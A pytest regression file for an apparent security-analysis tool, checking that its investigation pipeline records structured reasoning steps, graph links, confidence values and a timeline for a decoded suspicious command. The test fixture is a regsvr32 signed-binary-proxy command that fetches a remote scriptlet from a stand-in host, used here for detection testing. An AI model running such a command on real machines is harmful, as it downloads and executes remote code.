"""ADR-0014 · Slice-B · ReasoningStep recorder regression tests.

Locks the §1.1.7 contract: every promotion emits a structured
ReasoningStep record with input/output nodes, confidence delta, rule
id, and analyst-facing explanation.
"""
from __future__ import annotations

import pytest

from nivxforge.cim.fact_substrate import (
    DecoderLayer,
    FactSubstrate,
    IOCRecord,
    MITREHit,
    TIHitRecord,
)
from nivxforge.investigation import (
    CIO,
    build_cio,
    validate_cio,
)
from nivxforge.investigation.models import ReasoningStep


def _regsvr32_substrate() -> FactSubstrate:
    return FactSubstrate(
        input_text="regsvr32 /u /s /i:http://192.1",
        input_kind="powershell",
        source_endpoint="/api/decode/smart",
        decoder_chain=[
            DecoderLayer(idx=0, op="powershell-encoded",
                         input_kind="b64", output_kind="text",
                         output_preview="regsvr32 /u /s /i:http://192.1"),
        ],
        iocs=[
            IOCRecord(kind="url", value="http://192.1",
                      normalized_value="http://192.1",
                      stage_passed=["syntactic", "context"]),
        ],
        mitre_hits=[
            MITREHit(technique_id="T1218.010", name="Regsvr32", tactic="Defense Evasion"),
            MITREHit(technique_id="T1071.001", name="Web Protocols", tactic="C2"),
        ],
        ti_hits=[
            TIHitRecord(provider="internal", label="signed-binary proxy",
                        subject="regsvr32"),
        ],
        reasoning_notes=["Observed regsvr32 acting as signed-binary proxy for http://192.1"],
    )


class TestReasoningStepEmission:
    def test_ingest_step_present(self):
        cio = build_cio(_regsvr32_substrate())
        assert cio.reasoning_steps, "reasoning_steps must not be empty"
        first = cio.reasoning_steps[0]
        assert first.rule == "input.ingest"
        assert first.input_nodes == []
        assert len(first.output_nodes) == 1

    def test_decoder_step_emitted_per_layer(self):
        cio = build_cio(_regsvr32_substrate())
        decoder_steps = [s for s in cio.reasoning_steps if s.rule.startswith("decoder.")]
        assert len(decoder_steps) == 1
        assert decoder_steps[0].rule == "decoder.powershell-encoded"
        # explanation must be analyst-facing, not a rule id
        assert "PowerShell" in decoder_steps[0].explanation or "decoded" in decoder_steps[0].explanation.lower()

    def test_ioc_step_emitted_and_explanation_names_the_ioc(self):
        cio = build_cio(_regsvr32_substrate())
        ioc_steps = [s for s in cio.reasoning_steps if s.rule.startswith("ioc.")]
        assert len(ioc_steps) == 1
        assert "http://192.1" in ioc_steps[0].explanation

    def test_mitre_step_emitted_per_technique(self):
        cio = build_cio(_regsvr32_substrate())
        mitre_steps = [s for s in cio.reasoning_steps if s.rule.startswith("mitre.map.")]
        # Deduped input has 2 unique techniques
        assert len(mitre_steps) == 2
        rules = {s.rule for s in mitre_steps}
        assert "mitre.map.T1218.010" in rules
        assert "mitre.map.T1071.001" in rules

    def test_lolbin_step_emitted_for_regsvr32(self):
        cio = build_cio(_regsvr32_substrate())
        lolbin_steps = [s for s in cio.reasoning_steps if s.rule.startswith("lolbin.detect.")]
        rules = {s.rule for s in lolbin_steps}
        assert "lolbin.detect.regsvr32" in rules

    def test_family_step_emitted(self):
        cio = build_cio(_regsvr32_substrate())
        ti_steps = [s for s in cio.reasoning_steps if s.rule.startswith("ti.family.")]
        assert len(ti_steps) == 1
        assert "signed-binary proxy" in ti_steps[0].explanation

    def test_behaviour_step_emitted(self):
        cio = build_cio(_regsvr32_substrate())
        b_steps = [s for s in cio.reasoning_steps if s.rule == "behaviour.observe"]
        assert len(b_steps) == 1


class TestReasoningStepGraphLinkage:
    def test_every_step_output_nodes_exist_in_graph(self):
        cio = build_cio(_regsvr32_substrate())
        node_ids = {n.id for n in cio.evidence_graph.nodes}
        for s in cio.reasoning_steps:
            for out in s.output_nodes:
                assert out in node_ids, (
                    f"ReasoningStep {s.step_id} references missing output node {out}"
                )
            for inp in s.input_nodes:
                assert inp in node_ids, (
                    f"ReasoningStep {s.step_id} references missing input node {inp}"
                )

    def test_step_ids_dense_and_monotonic(self):
        cio = build_cio(_regsvr32_substrate())
        ids = [s.step_id for s in cio.reasoning_steps]
        # Dense: RS-001, RS-002, ..., no gaps
        for i, sid in enumerate(ids, start=1):
            assert sid == f"RS-{i:03d}", f"non-dense step_id at index {i}: {sid}"


class TestConfidenceReplayability:
    def test_confidence_monotonically_non_decreasing_within_bounds(self):
        cio = build_cio(_regsvr32_substrate())
        prev = 0.0
        for s in cio.reasoning_steps:
            assert 0.0 <= s.confidence_before <= 1.0
            assert 0.0 <= s.confidence_after <= 1.0
            assert s.confidence_before == pytest.approx(prev, abs=1e-4)
            prev = s.confidence_after

    def test_aggregate_confidence_equals_verdict_confidence(self):
        """Slice-C · aggregate confidence is now the unified verdict
        engine's weighted mean (§1.1.3)."""
        cio = build_cio(_regsvr32_substrate())
        assert cio.confidence == pytest.approx(
            cio.verdict["confidence"], abs=1e-4
        )


class TestTimelineIsView:
    """§1.1.7 · timeline is a view over reasoning_steps (no independent data)."""

    def test_timeline_length_matches_reasoning_steps(self):
        cio = build_cio(_regsvr32_substrate())
        assert len(cio.timeline) == len(cio.reasoning_steps)

    def test_timeline_carries_step_ids(self):
        cio = build_cio(_regsvr32_substrate())
        step_ids = {s.step_id for s in cio.reasoning_steps}
        timeline_ids = {t["step_id"] for t in cio.timeline}
        assert step_ids == timeline_ids

    def test_timeline_and_steps_ordered_identically(self):
        cio = build_cio(_regsvr32_substrate())
        for tl, st in zip(cio.timeline, cio.reasoning_steps):
            assert tl["step_id"] == st.step_id


class TestDeterminism:
    def test_reasoning_step_stream_deterministic(self):
        c1 = build_cio(_regsvr32_substrate())
        c2 = build_cio(_regsvr32_substrate())
        # Explanations, rule ids, timestamps, node ids must all match
        assert [s.model_dump() for s in c1.reasoning_steps] == \
               [s.model_dump() for s in c2.reasoning_steps]


class TestGatesStillHold:
    def test_g1_g2_pass_after_slice_b(self):
        cio = build_cio(_regsvr32_substrate())
        validate_cio(cio)

    def test_metadata_reports_slice_c(self):
        cio = build_cio(_regsvr32_substrate())
        assert cio.metadata.get("slice") == "C"
        assert cio.metadata.get("reasoning_step_count") == len(cio.reasoning_steps)
